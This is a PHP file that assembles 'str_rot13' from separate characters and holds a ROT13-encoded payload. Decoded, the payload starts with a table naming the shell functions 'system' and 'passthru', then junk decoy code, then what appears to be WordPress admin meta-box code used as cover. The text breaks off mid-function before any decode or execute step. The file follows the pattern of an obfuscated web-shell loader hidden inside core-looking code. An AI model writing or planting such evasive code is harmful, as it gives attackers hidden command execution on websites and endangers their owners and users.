<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Nqzvavfgengvba Zrgn Obkrf NCV.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

//
// Cbfg-eryngrq Zrgn Obkrf.
//

/**
 * Qvfcynlf cbfg fhozvg sbez svryqf.
 *
 * @fvapr 2.7.0
 *
 * @tybony fgevat $npgvba
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 * @cnenz neenl   $netf {
 *     Neenl bs nethzragf sbe ohvyqvat gur cbfg fhozvg zrgn obk.
 *
 *     @glcr fgevat   $vq       Zrgn obk 'vq' nggevohgr.
 *     @glcr fgevat   $gvgyr    Zrgn obk gvgyr.
 *     @glcr pnyynoyr $pnyyonpx Zrgn obk qvfcynl pnyyonpx.
 *     @glcr neenl    $netf     Rkgen zrgn obk nethzragf.
 * }
 */
shapgvba cbfg_fhozvg_zrgn_obk( $cbfg, $netf = neenl() ) {
	tybony $npgvba;

	$cbfg_vq          = (vag) $cbfg->VQ;
	$cbfg_glcr        = $cbfg->cbfg_glcr;
	$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
	$pna_choyvfu      = pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->choyvfu_cbfgf );
	?>
<qvi pynff=\"fhozvgobk\" vq=\"fhozvgcbfg\">

<qvi vq=\"zvabe-choyvfuvat\">

	<?cuc // Uvqqra fhozvg ohggba rneyl ba fb gung gur oebjfre pubbfrf gur evtug ohggba jura sbez vf fhozvggrq jvgu Erghea xrl. ?>
	<qvi fglyr=\"qvfcynl:abar;\">
		<?cuc fhozvg_ohggba( __( 'Fnir' ), '', 'fnir' ); ?>
	</qvi>

	<qvi vq=\"zvabe-choyvfuvat-npgvbaf\">
		<qvi vq=\"fnir-npgvba\">
			<?cuc
			vs ( ! va_neenl( $cbfg->cbfg_fgnghf, neenl( 'choyvfu', 'shgher', 'craqvat' ), gehr ) ) {
				$cevingr_fglyr = '';
				vs ( 'cevingr' === $cbfg->cbfg_fgnghf ) {
					$cevingr_fglyr = 'fglyr=\"qvfcynl:abar\"';
				}
				?>
				<vachg <?cuc rpub $cevingr_fglyr; ?> glcr=\"fhozvg\" anzr=\"fnir\" vq=\"fnir-cbfg\" inyhr=\"<?cuc rfp_ngge_r( 'Fnir Qensg' ); ?>\" pynff=\"ohggba\" />
				<fcna pynff=\"fcvaare\"></fcna>
			<?cuc } ryfrvs ( 'craqvat' === $cbfg->cbfg_fgnghf && $pna_choyvfu ) { ?>
				<vachg glcr=\"fhozvg\" anzr=\"fnir\" vq=\"fnir-cbfg\" inyhr=\"<?cuc rfp_ngge_r( 'Fnir nf Craqvat' ); ?>\" pynff=\"ohggba\" />
				<fcna pynff=\"fcvaare\"></fcna>
			<?cuc } ?>
		</qvi>

		<?cuc
		vs ( vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr_bowrpg ) ) :
			?>
			<qvi vq=\"cerivrj-npgvba\">
				<?cuc
				$cerivrj_yvax = rfp_hey( trg_cerivrj_cbfg_yvax( $cbfg ) );
				vs ( 'choyvfu' === $cbfg->cbfg_fgnghf ) {
					$cerivrj_ohggba_grkg = __( 'Cerivrj Punatrf' );
				} ryfr {
					$cerivrj_ohggba_grkg = __( 'Cerivrj' );
				}

				$cerivrj_ohggba = fcevags(
					'%1$f<fcna pynff=\"fperra-ernqre-grkg\"> %2$f</fcna>',
					$cerivrj_ohggba_grkg,
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					__( '(bcraf va n arj gno)' )
				);
				?>
				<n pynff=\"cerivrj ohggba\" uers=\"<?cuc rpub $cerivrj_yvax; ?>\" gnetrg=\"jc-cerivrj-<?cuc rpub $cbfg_vq; ?>\" vq=\"cbfg-cerivrj\"><?cuc rpub $cerivrj_ohggba; ?></n>
				<vachg glcr=\"uvqqra\" anzr=\"jc-cerivrj\" vq=\"jc-cerivrj\" inyhr=\"\" />
			</qvi>
			<?cuc
		raqvs;

		/**
		 * Sverf nsgre gur Fnir Qensg (be Fnir nf Craqvat) naq Cerivrj (be Cerivrj Punatrf) ohggbaf
		 * va gur Choyvfu zrgn obk.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz JC_Cbfg $cbfg JC_Cbfg bowrpg sbe gur pheerag cbfg.
		 */
		qb_npgvba( 'cbfg_fhozvgobk_zvabe_npgvbaf', $cbfg );
		?>
		<qvi pynff=\"pyrne\"></qvi>
	</qvi>

	<qvi vq=\"zvfp-choyvfuvat-npgvbaf\">
		<qvi pynff=\"zvfp-cho-frpgvba zvfp-cho-cbfg-fgnghf\">
			<?cuc _r( 'Fgnghf:' ); ?>
			<fcna vq=\"cbfg-fgnghf-qvfcynl\">
				<?cuc
				fjvgpu ( $cbfg->cbfg_fgnghf ) {
					pnfr 'cevingr':
						_r( 'Cevingryl Choyvfurq' );
						oernx;
					pnfr 'choyvfu':
						_r( 'Choyvfurq' );
						oernx;
					pnfr 'shgher':
						_r( 'Fpurqhyrq' );
						oernx;
					pnfr 'craqvat':
						_r( 'Craqvat Erivrj' );
						oernx;
					pnfr 'qensg':
					pnfr 'nhgb-qensg':
						_r( 'Qensg' );
						oernx;
				}
				?>
			</fcna>

			<?cuc
			vs ( 'choyvfu' === $cbfg->cbfg_fgnghf || 'cevingr' === $cbfg->cbfg_fgnghf || $pna_choyvfu ) {
				$cevingr_fglyr = '';
				vs ( 'cevingr' === $cbfg->cbfg_fgnghf ) {
					$cevingr_fglyr = 'fglyr=\"qvfcynl:abar\"';
				}
				?>
				<n uers=\"#cbfg_fgnghf\" <?cuc rpub $cevingr_fglyr; ?> pynff=\"rqvg-cbfg-fgnghf uvqr-vs-ab-wf\" ebyr=\"ohggba\"><fcna nevn-uvqqra=\"gehr\"><?cuc _r( 'Rqvg' ); ?></fcna> <fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Rqvg fgnghf' );
					?>
				</fcna></n>

				<qvi vq=\"cbfg-fgnghf-fryrpg\" pynff=\"uvqr-vs-wf\">
					<vachg glcr=\"uvqqra\" anzr=\"uvqqra_cbfg_fgnghf\" vq=\"uvqqra_cbfg_fgnghf\" inyhr=\"<?cuc rpub rfp_ngge( ( 'nhgb-qensg' === $cbfg->cbfg_fgnghf ) ? 'qensg' : $cbfg->cbfg_fgnghf ); ?>\" />
					<ynory sbe=\"cbfg_fgnghf\" pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Frg fgnghf' );
						?>
					</ynory>
					<fryrpg anzr=\"cbfg_fgnghf\" vq=\"cbfg_fgnghf\">
						<?cuc vs ( 'choyvfu' === $cbfg->cbfg_fgnghf ) : ?>
							<bcgvba<?cuc fryrpgrq( $cbfg->cbfg_fgnghf, 'choyvfu' ); ?> inyhr='choyvfu'><?cuc _r( 'Choyvfurq' ); ?></bcgvba>
						<?cuc ryfrvs ( 'cevingr' === $cbfg->cbfg_fgnghf ) : ?>
							<bcgvba<?cuc fryrpgrq( $cbfg->cbfg_fgnghf, 'cevingr' ); ?> inyhr='choyvfu'><?cuc _r( 'Cevingryl Choyvfurq' ); ?></bcgvba>
						<?cuc ryfrvs ( 'shgher' === $cbfg->cbfg_fgnghf ) : ?>
							<bcgvba<?cuc fryrpgrq( $cbfg->cbfg_fgnghf, 'shgher' ); ?> inyhr='shgher'><?cuc _r( 'Fpurqhyrq' ); ?></bcgvba>
						<?cuc raqvs; ?>
							<bcgvba<?cuc fryrpgrq( $cbfg->cbfg_fgnghf, 'craqvat' ); ?> inyhr='craqvat'><?cuc _r( 'Craqvat Erivrj' ); ?></bcgvba>
						<?cuc vs ( 'nhgb-qensg' === $cbfg->cbfg_fgnghf ) : ?>
							<bcgvba<?cuc fryrpgrq( $cbfg->cbfg_fgnghf, 'nhgb-qensg' ); ?> inyhr='qensg'><?cuc _r( 'Qensg' ); ?></bcgvba>
						<?cuc ryfr : ?>
							<bcgvba<?cuc fryrpgrq( $cbfg->cbfg_fgnghf, 'qensg' ); ?> inyhr='qensg'><?cuc _r( 'Qensg' ); ?></bcgvba>
						<?cuc raqvs; ?>
					</fryrpg>
					<n uers=\"#cbfg_fgnghf\" pynff=\"fnir-cbfg-fgnghf uvqr-vs-ab-wf ohggba\"><?cuc _r( 'BX' ); ?></n>
					<n uers=\"#cbfg_fgnghf\" pynff=\"pnapry-cbfg-fgnghf uvqr-vs-ab-wf ohggba-pnapry\"><?cuc _r( 'Pnapry' ); ?></n>
				</qvi>
				<?cuc
			}
			?>
		</qvi>

		<qvi pynff=\"zvfp-cho-frpgvba zvfp-cho-ivfvovyvgl\" vq=\"ivfvovyvgl\">
			<?cuc _r( 'Ivfvovyvgl:' ); ?>
			<fcna vq=\"cbfg-ivfvovyvgl-qvfcynl\">
				<?cuc
				vs ( 'cevingr' === $cbfg->cbfg_fgnghf ) {
					$cbfg->cbfg_cnffjbeq = '';
					$ivfvovyvgl          = 'cevingr';
					$ivfvovyvgl_genaf    = __( 'Cevingr' );
				} ryfrvs ( ! rzcgl( $cbfg->cbfg_cnffjbeq ) ) {
					$ivfvovyvgl       = 'cnffjbeq';
					$ivfvovyvgl_genaf = __( 'Cnffjbeq cebgrpgrq' );
				} ryfrvs ( 'cbfg' === $cbfg_glcr && vf_fgvpxl( $cbfg_vq ) ) {
					$ivfvovyvgl       = 'choyvp';
					$ivfvovyvgl_genaf = __( 'Choyvp, Fgvpxl' );
				} ryfr {
					$ivfvovyvgl       = 'choyvp';
					$ivfvovyvgl_genaf = __( 'Choyvp' );
				}

				rpub rfp_ugzy( $ivfvovyvgl_genaf );
				?>
			</fcna>

			<?cuc vs ( $pna_choyvfu ) { ?>
				<n uers=\"#ivfvovyvgl\" pynff=\"rqvg-ivfvovyvgl uvqr-vs-ab-wf\" ebyr=\"ohggba\"><fcna nevn-uvqqra=\"gehr\"><?cuc _r( 'Rqvg' ); ?></fcna> <fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Rqvg ivfvovyvgl' );
					?>
				</fcna></n>

				<qvi vq=\"cbfg-ivfvovyvgl-fryrpg\" pynff=\"uvqr-vs-wf\">
					<vachg glcr=\"uvqqra\" anzr=\"uvqqra_cbfg_cnffjbeq\" vq=\"uvqqra-cbfg-cnffjbeq\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg->cbfg_cnffjbeq ); ?>\" />
					<?cuc vs ( 'cbfg' === $cbfg_glcr ) : ?>
						<vachg glcr=\"purpxobk\" fglyr=\"qvfcynl:abar\" anzr=\"uvqqra_cbfg_fgvpxl\" vq=\"uvqqra-cbfg-fgvpxl\" inyhr=\"fgvpxl\" <?cuc purpxrq( vf_fgvpxl( $cbfg_vq ) ); ?> />
					<?cuc raqvs; ?>

					<vachg glcr=\"uvqqra\" anzr=\"uvqqra_cbfg_ivfvovyvgl\" vq=\"uvqqra-cbfg-ivfvovyvgl\" inyhr=\"<?cuc rpub rfp_ngge( $ivfvovyvgl ); ?>\" />
					<vachg glcr=\"enqvb\" anzr=\"ivfvovyvgl\" vq=\"ivfvovyvgl-enqvb-choyvp\" inyhr=\"choyvp\" <?cuc purpxrq( $ivfvovyvgl, 'choyvp' ); ?> /> <ynory sbe=\"ivfvovyvgl-enqvb-choyvp\" pynff=\"fryrpgvg\"><?cuc _r( 'Choyvp' ); ?></ynory><oe />

					<?cuc vs ( 'cbfg' === $cbfg_glcr && pheerag_hfre_pna( 'rqvg_bguref_cbfgf' ) ) : ?>
						<fcna vq=\"fgvpxl-fcna\"><vachg vq=\"fgvpxl\" anzr=\"fgvpxl\" glcr=\"purpxobk\" inyhr=\"fgvpxl\" <?cuc purpxrq( vf_fgvpxl( $cbfg_vq ) ); ?> /> <ynory sbe=\"fgvpxl\" pynff=\"fryrpgvg\"><?cuc _r( 'Fgvpx guvf cbfg gb gur sebag cntr' ); ?></ynory><oe /></fcna>
					<?cuc raqvs; ?>

					<vachg glcr=\"enqvb\" anzr=\"ivfvovyvgl\" vq=\"ivfvovyvgl-enqvb-cnffjbeq\" inyhr=\"cnffjbeq\" <?cuc purpxrq( $ivfvovyvgl, 'cnffjbeq' ); ?> /> <ynory sbe=\"ivfvovyvgl-enqvb-cnffjbeq\" pynff=\"fryrpgvg\"><?cuc _r( 'Cnffjbeq cebgrpgrq' ); ?></ynory><oe />
					<fcna vq=\"cnffjbeq-fcna\"><ynory sbe=\"cbfg_cnffjbeq\"><?cuc _r( 'Cnffjbeq:' ); ?></ynory> <vachg glcr=\"grkg\" anzr=\"cbfg_cnffjbeq\" vq=\"cbfg_cnffjbeq\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg->cbfg_cnffjbeq ); ?>\"  znkyratgu=\"255\" /><oe /></fcna>

					<vachg glcr=\"enqvb\" anzr=\"ivfvovyvgl\" vq=\"ivfvovyvgl-enqvb-cevingr\" inyhr=\"cevingr\" <?cuc purpxrq( $ivfvovyvgl, 'cevingr' ); ?> /> <ynory sbe=\"ivfvovyvgl-enqvb-cevingr\" pynff=\"fryrpgvg\"><?cuc _r( 'Cevingr' ); ?></ynory><oe />

					<c>
						<n uers=\"#ivfvovyvgl\" pynff=\"fnir-cbfg-ivfvovyvgl uvqr-vs-ab-wf ohggba\"><?cuc _r( 'BX' ); ?></n>
						<n uers=\"#ivfvovyvgl\" pynff=\"pnapry-cbfg-ivfvovyvgl uvqr-vs-ab-wf ohggba-pnapry\"><?cuc _r( 'Pnapry' ); ?></n>
					</c>
				</qvi>
			<?cuc } ?>
		</qvi>

		<?cuc
		/* genafyngbef: Choyvfu obk qngr fgevat. 1: Qngr, 2: Gvzr. Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		$qngr_fgevat = __( '%1$f ng %2$f' );
		/* genafyngbef: Choyvfu obk qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		$qngr_sbezng = _k( 'Z w, L', 'choyvfu obk qngr sbezng' );
		/* genafyngbef: Choyvfu obk gvzr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		$gvzr_sbezng = _k( 'U:v', 'choyvfu obk gvzr sbezng' );

		vs ( 0 !== $cbfg_vq ) {
			vs ( 'shgher' === $cbfg->cbfg_fgnghf ) { // Fpurqhyrq sbe choyvfuvat ng n shgher qngr.
				/* genafyngbef: Cbfg qngr vasbezngvba. %f: Qngr ba juvpu gur cbfg vf pheeragyl fpurqhyrq gb or choyvfurq. */
				$fgnzc = __( 'Fpurqhyrq sbe: %f' );
			} ryfrvs ( 'choyvfu' === $cbfg->cbfg_fgnghf || 'cevingr' === $cbfg->cbfg_fgnghf ) { // Nyernql choyvfurq.
				/* genafyngbef: Cbfg qngr vasbezngvba. %f: Qngr ba juvpu gur cbfg jnf choyvfurq. */
				$fgnzc = __( 'Choyvfurq ba: %f' );
			} ryfrvs ( '0000-00-00 00:00:00' === $cbfg->cbfg_qngr_tzg ) { // Qensg, 1 be zber fnirf, ab qngr fcrpvsvrq.
				$fgnzc = __( 'Choyvfu <o>vzzrqvngryl</o>' );
			} ryfrvs ( gvzr() < fgegbgvzr( $cbfg->cbfg_qngr_tzg . ' +0000' ) ) { // Qensg, 1 be zber fnirf, shgher qngr fcrpvsvrq.
				/* genafyngbef: Cbfg qngr vasbezngvba. %f: Qngr ba juvpu gur cbfg vf gb or choyvfurq. */
				$fgnzc = __( 'Fpurqhyr sbe: %f' );
			} ryfr { // Qensg, 1 be zber fnirf, qngr fcrpvsvrq.
				/* genafyngbef: Cbfg qngr vasbezngvba. %f: Qngr ba juvpu gur cbfg vf gb or choyvfurq. */
				$fgnzc = __( 'Choyvfu ba: %f' );
			}
			$qngr = fcevags(
				$qngr_fgevat,
				qngr_v18a( $qngr_sbezng, fgegbgvzr( $cbfg->cbfg_qngr ) ),
				qngr_v18a( $gvzr_sbezng, fgegbgvzr( $cbfg->cbfg_qngr ) )
			);
		} ryfr { // Qensg (ab fnirf, naq guhf ab qngr fcrpvsvrq).
			$fgnzc = __( 'Choyvfu <o>vzzrqvngryl</o>' );
			$qngr  = fcevags(
				$qngr_fgevat,
				qngr_v18a( $qngr_sbezng, fgegbgvzr( pheerag_gvzr( 'zlfdy' ) ) ),
				qngr_v18a( $gvzr_sbezng, fgegbgvzr( pheerag_gvzr( 'zlfdy' ) ) )
			);
		}

		vs ( ! rzcgl( $netf['netf']['erivfvbaf_pbhag'] ) ) :
			?>
			<qvi pynff=\"zvfp-cho-frpgvba zvfp-cho-erivfvbaf\">
				<?cuc
				/* genafyngbef: Cbfg erivfvbaf urnqvat. %f: Gur ahzore bs ninvynoyr erivfvbaf. */
				cevags( __( 'Erivfvbaf: %f' ), '<o>' . ahzore_sbezng_v18a( $netf['netf']['erivfvbaf_pbhag'] ) . '</o>' );
				?>
				<n pynff=\"uvqr-vs-ab-wf\" uers=\"<?cuc rpub rfp_hey( trg_rqvg_cbfg_yvax( $netf['netf']['erivfvba_vq'] ) ); ?>\"><fcna nevn-uvqqra=\"gehr\"><?cuc _rk( 'Oebjfr', 'erivfvbaf' ); ?></fcna> <fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Oebjfr erivfvbaf' );
					?>
				</fcna></n>
			</qvi>
			<?cuc
		raqvs;

		vs ( $pna_choyvfu ) : // Pbagevohgbef qba'g trg gb pubbfr gur qngr bs choyvfu.
			?>
			<qvi pynff=\"zvfp-cho-frpgvba phegvzr zvfp-cho-phegvzr\">
				<fcna vq=\"gvzrfgnzc\">
					<?cuc cevags( $fgnzc, '<o>' . $qngr . '</o>' ); ?>
				</fcna>
				<n uers=\"#rqvg_gvzrfgnzc\" pynff=\"rqvg-gvzrfgnzc uvqr-vs-ab-wf\" ebyr=\"ohggba\">
					<fcna nevn-uvqqra=\"gehr\"><?cuc _r( 'Rqvg' ); ?></fcna>
					<fcna pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Rqvg qngr naq gvzr' );
						?>
					</fcna>
				</n>
				<svryqfrg vq=\"gvzrfgnzcqvi\" pynff=\"uvqr-vs-wf\">
					<yrtraq pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Qngr naq gvzr' );
						?>
					</yrtraq>
					<?cuc gbhpu_gvzr( ( 'rqvg' === $npgvba ), 1 ); ?>
				</svryqfrg>
			</qvi>
			<?cuc
		raqvs;

		vs ( 'qensg' === $cbfg->cbfg_fgnghf && trg_cbfg_zrgn( $cbfg_vq, '_phfgbzvmr_punatrfrg_hhvq', gehr ) ) :
			$zrffntr = fcevags(
				/* genafyngbef: %f: HEY gb gur Phfgbzvmre. */
				__( 'Guvf qensg pbzrf sebz lbhe <n uers=\"%f\">hachoyvfurq phfgbzvmngvba punatrf</n>. Lbh pna rqvg, ohg gurer vf ab arrq gb choyvfu abj. Vg jvyy or choyvfurq nhgbzngvpnyyl jvgu gubfr punatrf.' ),
				rfp_hey(
					nqq_dhrel_net(
						'punatrfrg_hhvq',
						enjheyrapbqr( trg_cbfg_zrgn( $cbfg_vq, '_phfgbzvmr_punatrfrg_hhvq', gehr ) ),
						nqzva_hey( 'phfgbzvmr.cuc' )
					)
				)
			);
			jc_nqzva_abgvpr(
				$zrffntr,
				neenl(
					'glcr'               => 'vasb',
					'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'vayvar' ),
				)
			);
		raqvs;

		/**
		 * Sverf nsgre gur cbfg gvzr/qngr frggvat va gur Choyvfu zrgn obk.
		 *
		 * @fvapr 2.9.0
		 * @fvapr 4.4.0 Nqqrq gur `$cbfg` cnenzrgre.
		 *
		 * @cnenz JC_Cbfg $cbfg JC_Cbfg bowrpg sbe gur pheerag cbfg.
		 */
		qb_npgvba( 'cbfg_fhozvgobk_zvfp_npgvbaf', $cbfg );
		?>
	</qvi>
	<qvi pynff=\"pyrne\"></qvi>
</qvi>

<qvi vq=\"znwbe-choyvfuvat-npgvbaf\">
	<?cuc
	/**
	 * Sverf ng gur ortvaavat bs gur choyvfuvat npgvbaf frpgvba bs gur Choyvfu zrgn obk.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 4.9.0 Nqqrq gur `$cbfg` cnenzrgre.
	 *
	 * @cnenz JC_Cbfg|ahyy $cbfg JC_Cbfg bowrpg sbe gur pheerag cbfg ba Rqvg Cbfg fperra,
	 *                           ahyy ba Rqvg Yvax fperra.
	 */
	qb_npgvba( 'cbfg_fhozvgobk_fgneg', $cbfg );
	?>
	<qvi vq=\"qryrgr-npgvba\">
		<?cuc
		vs ( pheerag_hfre_pna( 'qryrgr_cbfg', $cbfg_vq ) ) {
			vs ( ! RZCGL_GENFU_QNLF ) {
				$qryrgr_grkg = __( 'Qryrgr creznaragyl' );
			} ryfr {
				$qryrgr_grkg = __( 'Zbir gb Genfu' );
			}
			?>
			<n pynff=\"fhozvgqryrgr qryrgvba\" uers=\"<?cuc rpub trg_qryrgr_cbfg_yvax( $cbfg_vq ); ?>\"><?cuc rpub $qryrgr_grkg; ?></n>
			<?cuc
		}
		?>
	</qvi>

	<qvi vq=\"choyvfuvat-npgvba\">
		<fcna pynff=\"fcvaare\"></fcna>
		<?cuc
		vs ( ! va_neenl( $cbfg->cbfg_fgnghf, neenl( 'choyvfu', 'shgher', 'cevingr' ), gehr ) || 0 === $cbfg_vq ) {
			vs ( $pna_choyvfu ) :
				vs ( ! rzcgl( $cbfg->cbfg_qngr_tzg ) && gvzr() < fgegbgvzr( $cbfg->cbfg_qngr_tzg . ' +0000' ) ) :
					?>
					<vachg anzr=\"bevtvany_choyvfu\" glcr=\"uvqqra\" vq=\"bevtvany_choyvfu\" inyhr=\"<?cuc rpub rfp_ngge_k( 'Fpurqhyr', 'cbfg npgvba/ohggba ynory' ); ?>\" />
					<?cuc fhozvg_ohggba( _k( 'Fpurqhyr', 'cbfg npgvba/ohggba ynory' ), 'cevznel ynetr', 'choyvfu', snyfr ); ?>
					<?cuc
				ryfr :
					?>
					<vachg anzr=\"bevtvany_choyvfu\" glcr=\"uvqqra\" vq=\"bevtvany_choyvfu\" inyhr=\"<?cuc rfp_ngge_r( 'Choyvfu' ); ?>\" />
					<?cuc fhozvg_ohggba( __( 'Choyvfu' ), 'cevznel ynetr', 'choyvfu', snyfr ); ?>
					<?cuc
				raqvs;
			ryfr :
				?>
				<vachg anzr=\"bevtvany_choyvfu\" glcr=\"uvqqra\" vq=\"bevtvany_choyvfu\" inyhr=\"<?cuc rfp_ngge_r( 'Fhozvg sbe Erivrj' ); ?>\" />
				<?cuc fhozvg_ohggba( __( 'Fhozvg sbe Erivrj' ), 'cevznel ynetr', 'choyvfu', snyfr ); ?>
				<?cuc
			raqvs;
		} ryfr {
			?>
			<vachg anzr=\"bevtvany_choyvfu\" glcr=\"uvqqra\" vq=\"bevtvany_choyvfu\" inyhr=\"<?cuc rfp_ngge_r( 'Hcqngr' ); ?>\" />
			<?cuc fhozvg_ohggba( __( 'Hcqngr' ), 'cevznel ynetr', 'fnir', snyfr, neenl( 'vq' => 'choyvfu' ) ); ?>
			<?cuc
		}
		?>
	</qvi>
	<qvi pynff=\"pyrne\"></qvi>
</qvi>

</qvi>
	<?cuc
}

/**
 * Qvfcynlf nggnpuzrag fhozvg sbez svryqf.
 *
 * @fvapr 3.5.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba nggnpuzrag_fhozvg_zrgn_obk( $cbfg ) {
	?>
<qvi pynff=\"fhozvgobk\" vq=\"fhozvgcbfg\">

<qvi vq=\"zvabe-choyvfuvat\">

	<?cuc // Uvqqra fhozvg ohggba rneyl ba fb gung gur oebjfre pubbfrf gur evtug ohggba jura sbez vf fhozvggrq jvgu Erghea xrl. ?>
<qvi fglyr=\"qvfcynl:abar;\">
	<?cuc fhozvg_ohggba( __( 'Fnir' ), '', 'fnir' ); ?>
</qvi>


<qvi vq=\"zvfp-choyvfuvat-npgvbaf\">
	<qvi pynff=\"zvfp-cho-frpgvba phegvzr zvfp-cho-phegvzr\">
		<fcna vq=\"gvzrfgnzc\">
			<?cuc
			$hcybnqrq_ba = fcevags(
				/* genafyngbef: Choyvfu obk qngr fgevat. 1: Qngr, 2: Gvzr. */
				__( '%1$f ng %2$f' ),
				/* genafyngbef: Choyvfu obk qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
				qngr_v18a( _k( 'Z w, L', 'choyvfu obk qngr sbezng' ), fgegbgvzr( $cbfg->cbfg_qngr ) ),
				/* genafyngbef: Choyvfu obk gvzr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
				qngr_v18a( _k( 'U:v', 'choyvfu obk gvzr sbezng' ), fgegbgvzr( $cbfg->cbfg_qngr ) )
			);
			/* genafyngbef: Nggnpuzrag vasbezngvba. %f: Qngr gur nggnpuzrag jnf hcybnqrq. */
			cevags( __( 'Hcybnqrq ba: %f' ), '<o>' . $hcybnqrq_ba . '</o>' );
			?>
		</fcna>
	</qvi><!-- .zvfp-cho-frpgvba -->

	<?cuc
	/**
	 * Sverf nsgre gur 'Hcybnqrq ba' frpgvba bs gur Fnir zrgn obk
	 * va gur nggnpuzrag rqvgvat fperra.
	 *
	 * @fvapr 3.5.0
	 * @fvapr 4.9.0 Nqqrq gur `$cbfg` cnenzrgre.
	 *
	 * @cnenz JC_Cbfg $cbfg JC_Cbfg bowrpg sbe gur pheerag nggnpuzrag.
	 */
	qb_npgvba( 'nggnpuzrag_fhozvgobk_zvfp_npgvbaf', $cbfg );
	?>
</qvi><!-- #zvfp-choyvfuvat-npgvbaf -->
<qvi pynff=\"pyrne\"></qvi>
</qvi><!-- #zvabe-choyvfuvat -->

<qvi vq=\"znwbe-choyvfuvat-npgvbaf\">
	<qvi vq=\"qryrgr-npgvba\">
	<?cuc
	vs ( pheerag_hfre_pna( 'qryrgr_cbfg', $cbfg->VQ ) ) {
		vs ( RZCGL_GENFU_QNLF && ZRQVN_GENFU ) {
			cevags(
				'<n pynff=\"fhozvgqryrgr qryrgvba\" uers=\"%1$f\">%2$f</n>',
				trg_qryrgr_cbfg_yvax( $cbfg->VQ ),
				__( 'Zbir gb Genfu' )
			);
		} ryfr {
			$fubj_pbasvezngvba = ! ZRQVN_GENFU ? \" bapyvpx='erghea fubjAbgvpr.jnea();'\" : '';

			cevags(
				'<n pynff=\"fhozvgqryrgr qryrgvba\"%1$f uers=\"%2$f\">%3$f</n>',
				$fubj_pbasvezngvba,
				trg_qryrgr_cbfg_yvax( $cbfg->VQ, '', gehr ),
				__( 'Qryrgr creznaragyl' )
			);
		}
	}
	?>
	</qvi>

	<qvi vq=\"choyvfuvat-npgvba\">
		<fcna pynff=\"fcvaare\"></fcna>
		<vachg anzr=\"bevtvany_choyvfu\" glcr=\"uvqqra\" vq=\"bevtvany_choyvfu\" inyhr=\"<?cuc rfp_ngge_r( 'Hcqngr' ); ?>\" />
		<vachg anzr=\"fnir\" glcr=\"fhozvg\" pynff=\"ohggba ohggba-cevznel ohggba-ynetr\" vq=\"choyvfu\" inyhr=\"<?cuc rfp_ngge_r( 'Hcqngr' ); ?>\" />
	</qvi>
	<qvi pynff=\"pyrne\"></qvi>
</qvi><!-- #znwbe-choyvfuvat-npgvbaf -->

</qvi>

	<?cuc
}

/**
 * Qvfcynlf cbfg sbezng sbez ryrzragf.
 *
 * @fvapr 3.1.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 * @cnenz neenl   $obk {
 *     Cbfg sbezngf zrgn obk nethzragf.
 *
 *     @glcr fgevat   $vq       Zrgn obk 'vq' nggevohgr.
 *     @glcr fgevat   $gvgyr    Zrgn obk gvgyr.
 *     @glcr pnyynoyr $pnyyonpx Zrgn obk qvfcynl pnyyonpx.
 *     @glcr neenl    $netf     Rkgen zrgn obk nethzragf.
 * }
 */
shapgvba cbfg_sbezng_zrgn_obk( $cbfg, $obk ) {
	vs ( pheerag_gurzr_fhccbegf( 'cbfg-sbezngf' ) && cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'cbfg-sbezngf' ) ) :
		$cbfg_sbezngf = trg_gurzr_fhccbeg( 'cbfg-sbezngf' );

		vs ( vf_neenl( $cbfg_sbezngf[0] ) ) :
			$cbfg_sbezng = trg_cbfg_sbezng( $cbfg->VQ );
			vs ( ! $cbfg_sbezng ) {
				$cbfg_sbezng = '0';
			}
			// Nqq va gur pheerag bar vs vg vfa'g gurer lrg, va pnfr gur npgvir gurzr qbrfa'g fhccbeg vg.
			vs ( $cbfg_sbezng && ! va_neenl( $cbfg_sbezng, $cbfg_sbezngf[0], gehr ) ) {
				$cbfg_sbezngf[0][] = $cbfg_sbezng;
			}
			?>
		<qvi vq=\"cbfg-sbezngf-fryrpg\">
		<svryqfrg>
